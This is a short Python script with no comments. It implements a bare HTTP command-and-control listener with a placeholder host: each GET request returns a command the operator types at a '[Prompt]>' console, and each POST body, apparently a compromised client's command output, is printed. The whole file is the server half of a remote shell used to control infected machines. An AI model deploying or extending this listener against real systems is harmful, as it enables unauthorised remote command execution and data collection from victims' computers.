import http.server

HOST = "Your Server is here"
PORT = 8080


class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        command = input("[Prompt]> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        res_body = self.rfile.read(length)
        print(res_body.decode())


def main():
    http_server = http.server.HTTPServer
    httpd = http_server((HOST, PORT), RequestHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Stopped.')
        httpd.server_close()


if __name__ == "__main__":
    main()
